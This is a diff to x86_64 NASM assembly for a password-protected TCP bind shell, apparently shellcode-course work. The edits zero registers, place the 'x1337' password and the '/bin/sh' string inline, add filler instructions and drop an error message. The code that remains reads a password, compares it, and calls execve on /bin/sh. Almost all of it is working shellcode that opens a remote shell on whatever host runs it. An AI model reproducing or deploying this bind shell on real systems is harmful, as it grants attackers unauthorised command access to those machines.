@@ -3,8 +3,17 @@ global _start
 ; TCP bindshell code
 ; NASM x86_64 intel
 section .text
-_start:
+_start:	
+	;Resetting the register
+	cld
 	
+	xor rax,rax
+	mov rsi,rax
+	mov rdi,rsi
+	mov rdx,rdi
+	mov r8,rdx
+	mov rcx,r8
+	mov rbx,rcx
 	;Step1: Create a socket using the socket syscall
 	;format of the socket call as displayed by man socket
 	; int socket(int domain, int type, int protocol)
@@ -113,24 +122,28 @@ _start:
 	
 	xor rax,rax
 	mov al,33
-        add sil,2
+        add sil,1
         syscall
 ;Reading password input from user
 
 	xor rax,rax
-	jmp next
-	inp resb 64
-	pass db "x1337"
-next:
+	jmp l2
+	;garbage instructions
+	xor rax,rax
+	xor rax,rax
+	inp: db "xxxxxxxx"	
 	;Reading Input
+l2:
 	mov dil,al
 	lea rsi,[rel inp]
 	mov dl,64
 	syscall
 	
-	;Clearing Directional Flag
+	jmp l3
+	p1: db "x1337"
+l3:
 	lea rsi,[rel inp]
-	lea rdi,[rel pass]
+	lea rdi,[rel p1]
 	mov bl,6
 	sub bl,al
 	js exiting
@@ -138,22 +151,15 @@ next:
 	mov cl,5
 	rep cmpsb 
 	jz ExecCall
-	
-	;Exiting
 exiting:
-	jmp printMessage
-	msg: db "Incorrect Message",0xa
-	
-printMessage:
-	
+	;ExitSyscall	
 	xor rax,rax
 	mov al,60
 	mov dil,0
 	syscall
 	;Compare string
 	;Call Execve
-	
-	hw : db  "/bin/sh"
+
 ExecCall:
 	xor rax,rax
 	lea rdi, [rel hw]
@@ -165,3 +171,5 @@ ExecCall:
 	lea rdx,[rdi+16]
 	mov al,59
 	syscall
+	
+	hw: db "/bin/sh"
